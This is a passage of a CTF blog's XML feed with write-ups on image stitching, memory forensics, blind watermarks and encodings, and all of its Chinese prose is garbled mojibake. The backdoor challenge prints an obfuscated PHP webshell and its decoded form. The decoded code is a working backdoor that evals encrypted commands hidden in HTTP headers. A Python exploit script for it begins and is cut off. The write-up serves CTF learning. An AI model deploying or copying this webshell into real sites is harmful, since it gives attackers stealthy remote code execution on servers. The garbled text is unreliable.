ï¼Œæœ‰çš„æ—¶å€™æ„Ÿè§‰ä¸€ä¸ªå°æ¯”èµ›å°±è§£å‡ºæ¥ä¸€é“é¢˜ï¼Œæˆ–ç®€å•çš„é¢˜ï¼Œæ²¡å¿…è¦è®°å½•ï¼Œä½†æ˜¯åæ¥åœ¨é‡åˆ°è¿™ä¸ªé¢˜å‘ç°æ˜¯ä»¥å‰è§åˆ°è¿‡çš„ï¼Œæœ‰æ²¡æœ‰ç¬”è®°ï¼Œå„ç§ç™¾åº¦æµªè´¹æ—¶é—´ï¼Œè¿˜æ‰¾ä¸åˆ°è‡ªå·±æƒ³è¦çš„ã€‚å¦ä¸€æ–¹é¢æ„Ÿè§‰åšè¿™ä¸ªäº‹æƒ…ä¹Ÿæ˜¯æŒºé”»ç‚¼è‡ªå·±çš„ï¼Œå†™å‡ºæ¥è§£é¢˜è¿‡ç¨‹å¾ˆå¼€å¿ƒã€‚ä»¥åä¼šç›‘ç£è‡ªå·±ï¼Œæ—¶å¸¸æ›´æ–°åšå®¢ï¼Œå¤šåšé¢˜ã€‚è¯´çš„å†å¤šï¼Œå½’æ ¹ç»“åº•è¿˜æ˜¯è‡ªå·±å¤ªæ‡’äº†å§ã€‚ä»¥åå‹¤å¥‹ä¸€äº›ã€‚å¤šåšæœ‰æ„ä¹‰çš„äº‹æƒ…ã€‚å¤šæ›´åšå®¢ã€‚</p><p>â€æˆ‘ä»ä¸ç›¸ä¿¡ä¸€å¸†é£é¡ºçš„è¯´æ³•ï¼Œä¸€å¸†é£é¡ºä»£è¡¨ç€ä½ æ²¡æœ‰é‡åˆ°ä»»ä½•å›°éš¾ï¼Œä¹Ÿå°±è¯´ä½ æ²¡æœ‰ç»å†è¿‡æ‰“å‡»ï¼Œä¹Ÿå°±æ²¡æœ‰ç§¯ç´¯ç›¸å¯¹åº”çš„ç»éªŒã€‚å­¦èµ°è·¯è¦ç»å†æ‘”è·¤ï¼Œå­¦éª‘è‡ªè¡Œè½¦è¦ç»å†æ‘”è·¤ï¼Œå­¦æ»‘é›ªè¦ç»å†æ‘”è·¤ï¼Œä½ éœ€è¦ä½“éªŒé‚£ç§æ‘”è·¤çš„ç—›æ„Ÿï¼Œä½ æ‰èƒ½å¤Ÿåœ¨æ‘”è·¤å‰åšå‡ºç›¸åº”çš„åŠ¨ä½œæ¥è®©è‡ªå·±å›å½’æ­£è½¨ã€‚æˆ‘ä»¬å‡è®¾ä¸€ä¸ªåœºæ™¯ï¼Œä½ ä¸‹é¢æ˜¯ä¸‡ä¸ˆæ·±æ¸Šï¼Œè€Œä½ è¦å¾’æ‰‹æ”€å²©ï¼Œä»ä¸€ä¸ªå‚ç›´å¡åº¦çš„å±±è„šï¼Œçˆ¬åˆ°ä¸Šåƒç±³çš„å±±é¡¶ã€‚ç”¨è„šæŒ‡å¤´éƒ½èƒ½æƒ³åˆ°ï¼Œä½ æ­»äº¡çš„åœºæ™¯æ— æ•°ä¸ªï¼Œåªè¦ä¸€æ¬¡å¤±è¯¯ä½ å°±å¯èƒ½æ‰è½å±±å´–ç²‰èº«ç¢éª¨ï¼Œè€Œä½ çš„æˆåŠŸåœºæ™¯åªæœ‰ä¸€ä¸ªï¼šæ´»ç€ä¸Šå»ã€‚æ‰€ä»¥ä½ å¯¹è¿™åº§å±±è¦æœ‰å¿ƒå­˜æ•¬ç•ï¼Œè¦å°å¿ƒç¿¼ç¿¼ï¼Œä¸ç‚«æŠ€ä¸å¼ æ‰¬ï¼Œä½ è¦è°ƒæ•´åˆ°æœ€è°¦å‘çš„çŠ¶æ€ï¼Œè¿œç¦»å–§åš£ï¼Œå¬åˆ°è‡ªå·±å¿ƒè·³çš„å£°éŸ³ï¼Œæ•¬ç•æ¯ä¸€ä¸ªæŠ“æ‰‹ç‚¹ã€‚æŠ“æ‰‹çš„ç‚¹å¾ˆå¤šï¼Œæœ‰å¤§æœ‰å°ï¼Œä½ ä¸èƒ½é‡è§†ä¸€ä¸ªè€Œè½»è§†å¦ä¸€ä¸ªï¼Œå› ä¸ºä½ è½»è§†ä»»ä½•ä¸€ä¸ªçš„åæœéƒ½æ˜¯ä¸€æ ·çš„ï¼Œé‚£å°±æ˜¯æ­»äº¡ã€‚â€œ  </p><p>é€ç»™è‡ªå·±ï¼Œè°¦å‘ä¸€äº›ã€‚</p><p>ç”Ÿæ—¥å¿«ä¹~<br><img src="/images/my2021/13.png" alt="image-20220130172521536"></p><blockquote><p>ç”Ÿæ—¥å¿«ä¹<br>ä¸€ç›´åœ¨è·¯ä¸Š<br>åŠ æ²¹ï¼<br>è¯»ä¹¦å¤ªå°‘ï¼Œæƒ³çš„å¤ªå¤š</p></blockquote>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>2022hgame</title>
      <link href="/2022/01/28/2023hgame/"/>
      <url>/2022/01/28/2023hgame/</url>
      
        <content type="html"><![CDATA[<p>æš‚æ— </p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>2022hwsgogogo</title>
      <link href="/2022/01/26/2022hwsgogogo/"/>
      <url>/2022/01/26/2022hwsgogogo/</url>
      
        <content type="html"><![CDATA[<h4 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h4><h5 id="gogogo"><a href="#gogogo" class="headerlink" title="gogogo"></a>gogogo</h5><p>è€ƒç‚¹ï¼šæ‹¼å›¾+å–è¯+Aztec ç <br>ä¸‹è½½ä¸‹æ¥å‹ç¼©åŒ…æœ‰ä¸¤ä¸ªé™„ä»¶ï¼Œåˆ†åˆ«è§£å‹ä¸€ä¸‹ï¼Œä¸€ä¸ªæ˜¯æœ‰è®¸å¤šå›¾ç‰‡ï¼Œä¸€ä¸ªæ˜¯ä¸€ä¸ªrawæ–‡ä»¶ï¼Œæ˜¾ç„¶æ˜¯å–è¯äº†ã€‚<br>å…ˆçœ‹è¿™ä¸ªæœ‰è®¸å¤šå°å›¾ç‰‡çš„å‹ç¼©åŒ…ï¼Œæ˜¾ç„¶æ‹¼å›¾äº†ï¼Œæ€»å…±256å¼ å›¾ç‰‡ï¼Œæ˜¯16<em>16çš„å›¾ç‰‡ï¼Œæ˜¯160</em>100çš„å°å›¾ç‰‡<br><strong><img src="/images/hws2022/1.png" alt="image-20220126202221239"></strong><br>ç›´æ¥<code>montage *png -tile 16x16 -geometry 160x100+0+0 out.png</code>åˆæˆä¸€ä¸ªå¤§å›¾ç‰‡<br>è¿™è¾¹ç”¨gapsæ‹¼äº†å‡ æ¬¡æ²¡å‡ºï¼Œæœæ–­æŠŠout.pngæ”¹ä¸€ä¸‹å¤§å°ï¼Œå¤§å›¾å®¤ 2560<em>1600çš„ï¼Œæˆ‘ä»¬æ”¹æˆæ­£æ­£æ–¹å½¢ï¼Œ1600</em>1600<br><img src="/images/hws2022/2.png" alt="image-20220126202810888"><br><code>gaps --image=out2.png --generations=15 --population=256 --size=100 --verbose</code><br>åœ¨æ‹¼ä¸€ä¸‹å°±å‡ºæ¥äº†ï¼Œæ³¨æ„å‚æ•°<br><img src="/images/hws2022/3.png" alt="image-20220126203016856"><br>flagå…³é”®å­—æ²¡æœ‰ï¼Œæœä¸€ä¸ªzipï¼Œæ¡Œé¢ä¸Šæœ‰csgo.zip<br><code> python vol.py -f 2.raw --profile=WinXPSP2x86 filescan | grep flag</code><br><code> python vol.py -f 2.raw --profile=WinXPSP2x86 filescan | grep zip</code><br><img src="/images/hws2022/4.png" alt="image-20220126203415648"><br><code>python vol.py -f 2.raw --profile=WinXPSP2x86 dumpfiles -Q 0x0000000002182dc0 -D ./dasctf -u</code><br>æä¸€ä¸‹ï¼Œæœ‰å¯†ç ,ç”¨åˆšåˆšçš„å¯†ç è§£å‹ï¼Œé‡Œé¢æ˜¯ä¸¤ä¸ªå›¾ç‰‡ï¼Œç¬¬ä¸€ä¸ªå›¾ç‰‡å®¤csgoå›¾ç‰‡ï¼Œç¬¬äºŒä¸ªæ˜¯ä¸€ä¸ªç ä¸­é—´ç¼ºäº†å®šä½ç¬¦ï¼Œç”¨è°·æ­Œæœä¸€ä¸‹ï¼Œæ˜¯Aztecï¼Œåœ¨çº¿ç½‘ç«™<code>https://products.aspose.app/barcode/zh-hans/generate</code>ï¼Œå…ˆç”Ÿæˆä¸€ä¸ªaztecï¼ŒæŠŠä¸­é—´çš„å®šä½ç¬¦æ‰£ä¸‹æ¥ï¼Œç„¶åè´´ä¸Šå»ï¼Œæ‰«ç å°±å¯ä»¥äº†ã€‚<br><img src="/images/hws2022/5.png" alt="image-2022012620341548"><br><img src="/images/hws2022/6.png" alt="image-20220126204727776"></p><h4 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h4><blockquote><p>ä¸€ç›´åœ¨è·¯ä¸Š</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> misc </tag>
            
            <tag> hws2022 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>D.I.E&amp;Trinity CTFéƒ¨åˆ†wp</title>
      <link href="/2022/01/24/D-I-E-Trinity-CTF%E9%83%A8%E5%88%86wp/"/>
      <url>/2022/01/24/D-I-E-Trinity-CTF%E9%83%A8%E5%88%86wp/</url>
      
        <content type="html"><![CDATA[<p><img src="/images/tjuctf/index.png" alt="image-20220124192143500"><br>emmm å¤©æ´¥å¤§å­¦å’Œå—äº¬å¤§å­¦çš„æ‹›æ–°èµ›ï¼Œé¢˜ç›®è¿˜æ˜¯å¾ˆæœ‰è´¨é‡çš„ï¼Œtcläº†ï¼Œæœ‰äº›é¢˜è¿˜æ˜¯ä¸ä¼š<br>è®°ä¸€ä¸‹å§</p><h4 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h4><h5 id="ç­¾åˆ°"><a href="#ç­¾åˆ°" class="headerlink" title="ç­¾åˆ°"></a>ç­¾åˆ°</h5><p>ä¸‹è½½ä¸€ä¸ªé™„ä»¶ï¼Œfileçœ‹ä¸€ä¸‹ï¼Œå‘ç°æ˜¯dataï¼Œä¸ç®¡äº† ï¼Œç›´æ¥foremoståˆ†ç¦»ä¸€ä¸‹<br><code>foremost data</code><br>æœ‰ä¸¤ä¸ªå›¾ç‰‡ä¸€ä¸ªjpgï¼Œä¸€ä¸ªpngä¸¤ä¸ªå›¾ç‰‡æ˜¯ä¸€æ ·çš„ï¼Œç›²çŒœ<code>ç›²æ°´å°</code><br>é¡¹ç›®ä¸‹è½½<code>https://github.com/chishaxie/BlindWaterMark</code><br>ç›´æ¥<code>python3 bwmforpy3.py decode 00001537.png 00001404.jpg a.png</code><br><img src="/images/tjuctf/1.png" alt="image-20220124194256825">å‘ç°ï¼Œå›¾ç‰‡ä¸å¤ªæ¸…æ¥šï¼Œé—®äº†ä¸‹å‡ºé¢˜äººï¼Œæœ‰alphaå€¼ï¼Œç ”ç©¶ä¸€ä¸‹è„šæœ¬<br><img src="/images/tjuctf/2.png" alt="image-20220124194320886"><br>çœ‹åˆ° <code>--alpha &lt;float&gt;,  Manual setting alpha (default is 3.0)</code><br>é»˜è®¤å€¼ä¸ºä¸‰ï¼Œæˆ‘ä»¬è°ƒåˆ°5<code> python3 bwmforpy3.py decode 00001537.png 00001404.jpg a.png --alpha 5</code><br>è¿˜æ˜¯ä¸æ¸…æ¥šï¼ŒåŠ åˆ°10  <code>python3 bwmforpy3.py decode 00001537.png 00001404.jpg a.png --alpha 10</code><br><img src="/images/tjuctf/3.png" alt="image-20220124194614378"></p><h5 id="ezdecode"><a href="#ezdecode" class="headerlink" title="ezdecode"></a>ezdecode</h5><p>ç­¾åˆ°é¢˜ï¼Œæ˜¯å„ç§ç¼–ç çš„ç»„åˆ</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">ç¼–ç 1ï¼šYou Know That</span><br><span class="line">ZmxhZ3t3M2xjMG1f   --&gt;base64</span><br><span class="line">flag&#123;w3lc0m_7o_amaz1n9_CTF_vv0RId_!&#125;</span><br><span class="line">ç¼–ç 2ï¼šKey == 2</span><br><span class="line">7_mznoaa19    --&gt;æ …æ    keyä¸ºä¸º2</span><br><span class="line">ç¼–ç 3ï¼šPlay With Bubble</span><br><span class="line">xilog-fahig-kalal-kytef-begig-nanyh-zumal-tuxox   --&gt;æ°”æ³¡</span><br><span class="line">`http://www.hiencode.com/bubble.html`</span><br><span class="line">_CTF_vv0RId_!&#125;</span><br></pre></td></tr></table></figure><h5 id="è¿™é‡Œæœ‰åé—¨ï¼"><a href="#è¿™é‡Œæœ‰åé—¨ï¼" class="headerlink" title="è¿™é‡Œæœ‰åé—¨ï¼"></a>è¿™é‡Œæœ‰åé—¨ï¼</h5><p>ä¸ªäººè®¤ä¸ºè¿™ä¸ªé¢˜è¿˜æ˜¯éå¸¸æœ‰è¶£çš„ï¼Œé‡Œé¢æ¶‰åŠçš„åŠ å¯†æ–¹æ³•è¿˜æ²¡ææ‡‚ï¼Œå†™ä¸€ä¸‹åšé¢˜è®°å½•å§<br>æ‹¿åˆ°é™„ä»¶ï¼Œé¢˜ç›®å·²ç»è¯´äº†ï¼Œæ˜¯åé—¨ï¼Œçœ‹äº†ä¸€ä¸‹,æ˜¾ç„¶æ˜¯ç»è¿‡æ··æ·†åŠ å¯†çš„</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$u</span>=<span class="string">&#x27;S+)$p.iS=$iSq[$m[2][$z]iS]iSiS;if(strpos(iS$p,$h)===0iS)&#123;$s[$iiS]=iS&quot;&quot;;$iSpiS=$ss($p,3);&#125;if(arriSiSay&#x27;</span>;</span><br><span class="line"><span class="variable">$H</span>=<span class="string">&#x27;s=&amp;iS$_SESSiSION;$ss=&quot;subsiSiStr&quot;;$sliS=&quot;stiSrtolower&quot;;$i=$miS[1][iS0].iS$m[iS1][iS1];$h=$sl($ss(md5iS&#x27;</span>;</span><br><span class="line"><span class="variable">$X</span>=<span class="string">&#x27;($i.iS$kh),0,iS3)iS);$f=$sl(iS$ssiS(iSmd5($i.$kf),iS0iS,iS3));$p=&quot;&quot;;foriS($z=1;$z&lt;couiSiSnt($m[1]);$z+i&#x27;</span>;</span><br><span class="line"><span class="variable">$L</span>=str_replace(<span class="string">&#x27;x&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;crexxatex_fxxunxction&#x27;</span>);</span><br><span class="line"><span class="variable">$E</span>=<span class="string">&#x27;;$i&lt;$l;)&#123;foriS($j=0;(iS$j&lt;$ciS&amp;&amp;iS$i&lt;$l);$jiSiS++,iS$i++)&#123;$o.=$t&#123;$iiS&#125;^$k&#123;$j&#125;iS;iS&#125;iS&#125;riSeturn $o;&#125;$iSr=iSiS$&#x27;</span>;</span><br><span class="line"><span class="variable">$Q</span>=<span class="string">&#x27;=basiSiSe64_encode(x(giSzcompress($o)iS,$k)iS);print(&quot;iS&lt;$k&gt;iS$d&lt;/iS$k&gt;&quot;);@siSessioniS_destroyiS();&#125;&#125;&#125;&#125;&#x27;</span>;</span><br><span class="line"><span class="variable">$p</span>=<span class="string">&#x27;_SiSERViSEiSR;iS$rr=@$r[&quot;HTTiSP_REFEiSRER&quot;iS];$ra=@$r[iS&quot;iSHTTP_ACCEiSPT_LANGiSUAGE&quot;]iS;ifiS($rr&amp;&amp;$iSra)&#123;$&#x27;</span>;</span><br><span class="line"><span class="variable">$l</span>=<span class="string">&#x27;iS$kiSh=&quot;3481&quot;iS;iS$kf=&quot;iS9diS7b&quot;;funiSctiSion x($t,$k)&#123;$c=strliSen($kiS);iSiS$l=strlen($tiS);$o=&quot;&quot;;foiSr(iS$i=0iS&#x27;</span>;</span><br><span class="line"><span class="variable">$h</span>=<span class="string">&#x27;ll(iS&quot;/([\\w])iS[\\w-]+(iS?:;q=0.iS([iSiS\\d]))?,?/&quot;,iS$riSa,iS$miS);if($q&amp;&amp;$m)&#123;@siSession_staiSrtiS(iS);$&#x27;</span>;</span><br><span class="line"><span class="variable">$Z</span>=<span class="string">&#x27;art();@evaiSl(@giSzuniSiSciSompress(@x(@baseiS64_decodeiS(pregiS_riSeplace(ariSray(&quot;/_/&quot;,&quot;/-/iS&quot;),arriSa&#x27;</span>;</span><br><span class="line"><span class="variable">$W</span>=<span class="string">&#x27;_key_exiSists(iS$i,$s))&#123;iS$siS[$i].=$piS;$e=iSiSstrpos($siS[$iiS]iS,$f);if($e)&#123;$k=$kh.$kiSf;ob_stiSiS&#x27;</span>;</span><br><span class="line"><span class="variable">$g</span>=<span class="string">&#x27;u=paiSrse_iSiSurl($rr);pariSse_siStr($u[&quot;queriSy&quot;],$iSq)iS;iSiS$q=array_iSvaluiSes($q);pregiS_match_a&#x27;</span>;</span><br><span class="line"><span class="variable">$D</span>=<span class="string">&#x27;y(iS&quot;/&quot;,iS&quot;iS+&quot;)iS,$ss($s[$i],iS0,$e)iS)),$k)))iS;$o=obiS_get_iSiScontents()iS;ob_eniSd_iScleaiSn();$d&#x27;</span>;</span><br><span class="line"><span class="variable">$O</span>=str_replace(<span class="string">&#x27;iS&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="variable">$l</span>.<span class="variable">$E</span>.<span class="variable">$p</span>.<span class="variable">$g</span>.<span class="variable">$h</span>.<span class="variable">$H</span>.<span class="variable">$X</span>.<span class="variable">$u</span>.<span class="variable">$W</span>.<span class="variable">$Z</span>.<span class="variable">$D</span>.<span class="variable">$Q</span>);</span><br><span class="line"><span class="variable">$q</span>=<span class="variable">$L</span>(<span class="string">&#x27;&#x27;</span>,<span class="variable">$O</span>);<span class="variable">$q</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>googleä¸€ä¸‹å…³é”®ä»£ç ï¼Œç›´æ¥å‡ºäº†ä¸€ä¸ªè§£å¯†ç½‘ç«™<code>https://www.unphp.net/</code>æŠŠä»£ç æ‹¿åˆ°è¿™ä¸ªç½‘ç«™è§£ä¸€ä¸‹<br><img src="/images/tjuctf/4.png" alt="image-20220124195541546"><br>åé¢ï¼Œæœåˆ°è¿™ä¸ªé©¬å­çŸ¥é“å±…ç„¶è¿˜å¯ä»¥ç›´æ¥è¾“å‡º<br><img src="/images/tjuctf/5.png" alt="image-20220124195909580"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="variable">$kh</span> = <span class="string">&quot;3481&quot;</span>;</span><br><span class="line"><span class="variable">$kf</span> = <span class="string">&quot;9d7b&quot;</span>;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">x</span>(<span class="params"><span class="variable">$t</span>, <span class="variable">$k</span></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$c</span> = strlen(<span class="variable">$k</span>);</span><br><span class="line">    <span class="variable">$l</span> = strlen(<span class="variable">$t</span>);</span><br><span class="line">    <span class="variable">$o</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">0</span>;<span class="variable">$i</span> &lt; <span class="variable">$l</span>;) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="variable">$j</span> = <span class="number">0</span>;(<span class="variable">$j</span> &lt; <span class="variable">$c</span> &amp;&amp; <span class="variable">$i</span> &lt; <span class="variable">$l</span>);<span class="variable">$j</span>++, <span class="variable">$i</span>++) &#123;</span><br><span class="line">            <span class="variable">$o</span>.= <span class="variable">$t</span>&#123;<span class="variable">$i</span>&#125; ^ <span class="variable">$k</span>&#123;<span class="variable">$j</span>&#125;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$o</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$r</span> = <span class="variable">$_SERVER</span>;</span><br><span class="line"><span class="variable">$rr</span> = @<span class="variable">$r</span>[<span class="string">&quot;HTTP_REFERER&quot;</span>];</span><br><span class="line"><span class="variable">$ra</span> = @<span class="variable">$r</span>[<span class="string">&quot;HTTP_ACCEPT_LANGUAGE&quot;</span>];</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$rr</span> &amp;&amp; <span class="variable">$ra</span>) &#123;</span><br><span class="line">    <span class="variable">$u</span> = parse_url(<span class="variable">$rr</span>);</span><br><span class="line">    parse_str(<span class="variable">$u</span>[<span class="string">&quot;query&quot;</span>], <span class="variable">$q</span>);</span><br><span class="line">    <span class="variable">$q</span> = array_values(<span class="variable">$q</span>);</span><br><span class="line">    preg_match_all(<span class="string">&quot;/([\w])[\w-]+(?:;q=0.([\d]))?,?/&quot;</span>, <span class="variable">$ra</span>, <span class="variable">$m</span>);</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$q</span> &amp;&amp; <span class="variable">$m</span>) &#123;</span><br><span class="line">        @session_start();</span><br><span class="line">        <span class="variable">$s</span> = &amp; <span class="variable">$_SESSION</span>;</span><br><span class="line">        <span class="variable">$ss</span> = <span class="string">&quot;substr&quot;</span>;</span><br><span class="line">        <span class="variable">$sl</span> = <span class="string">&quot;strtolower&quot;</span>;</span><br><span class="line">        <span class="variable">$i</span> = <span class="variable">$m</span>[<span class="number">1</span>][<span class="number">0</span>] . <span class="variable">$m</span>[<span class="number">1</span>][<span class="number">1</span>];</span><br><span class="line">        <span class="variable">$h</span> = <span class="variable">$sl</span>(<span class="variable">$ss</span>(md5(<span class="variable">$i</span> . <span class="variable">$kh</span>), <span class="number">0</span>, <span class="number">3</span>));</span><br><span class="line">        <span class="variable">$f</span> = <span class="variable">$sl</span>(<span class="variable">$ss</span>(md5(<span class="variable">$i</span> . <span class="variable">$kf</span>), <span class="number">0</span>, <span class="number">3</span>));</span><br><span class="line">        <span class="variable">$p</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="variable">$z</span> = <span class="number">1</span>;<span class="variable">$z</span> &lt; count(<span class="variable">$m</span>[<span class="number">1</span>]);<span class="variable">$z</span>++) <span class="variable">$p</span>.= <span class="variable">$q</span>[<span class="variable">$m</span>[<span class="number">2</span>][<span class="variable">$z</span>]];</span><br><span class="line">        <span class="keyword">if</span> (strpos(<span class="variable">$p</span>, <span class="variable">$h</span>) === <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="variable">$s</span>[<span class="variable">$i</span>] = <span class="string">&quot;&quot;</span>;</span><br><span class="line">            <span class="variable">$p</span> = <span class="variable">$ss</span>(<span class="variable">$p</span>, <span class="number">3</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (array_key_exists(<span class="variable">$i</span>, <span class="variable">$s</span>)) &#123;</span><br><span class="line">            <span class="variable">$s</span>[<span class="variable">$i</span>].= <span class="variable">$p</span>;</span><br><span class="line">            <span class="variable">$e</span> = strpos(<span class="variable">$s</span>[<span class="variable">$i</span>], <span class="variable">$f</span>);</span><br><span class="line">            <span class="keyword">if</span> (<span class="variable">$e</span>) &#123;</span><br><span class="line">                <span class="variable">$k</span> = <span class="variable">$kh</span> . <span class="variable">$kf</span>;</span><br><span class="line">                ob_start();</span><br><span class="line">                <span class="keyword">eval</span>(@gzuncompress(@x(base64_decode(preg_replace(<span class="keyword">array</span>(<span class="string">&quot;/_/&quot;</span>, <span class="string">&quot;/-/&quot;</span>), <span class="keyword">array</span>(<span class="string">&quot;/&quot;</span>, <span class="string">&quot;+&quot;</span>), <span class="variable">$ss</span>(<span class="variable">$s</span>[<span class="variable">$i</span>], <span class="number">0</span>, <span class="variable">$e</span>))), <span class="variable">$k</span>)));</span><br><span class="line">                <span class="variable">$o</span> = ob_get_contents();</span><br><span class="line">                ob_end_clean();</span><br><span class="line">                <span class="variable">$d</span> = base64_encode(x(gzcompress(<span class="variable">$o</span>), <span class="variable">$k</span>));</span><br><span class="line">                <span class="keyword">print</span> (<span class="string">&quot;&lt;<span class="subst">$k</span>&gt;<span class="subst">$d</span>&lt;/<span class="subst">$k</span>&gt;&quot;</span>);</span><br><span class="line">                @session_destroy();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>é©¬å­è¿˜è‡­è¿˜é•¿ï¼Œç›´æ¥æœé©¬å­é‡Œå…³é”®ä»£ç ï¼Œ<code>https://www.jianshu.com/p/c8099299ac2a</code><br>å½“æ—¶çœ‹çš„ä¸æ˜¯è¿™ä¸ªå¸ˆå‚…çš„æ–‡ç« ï¼Œå½“æ—¶çš„æ‰¾ä¸åˆ°äº†ï¼Œéƒ½ä¸€æ ·ï¼Œpythonä¸€å»ºåˆ©ç”¨è„šæœ¬</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> randint, choice</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> md5</span><br><span class="line"><span 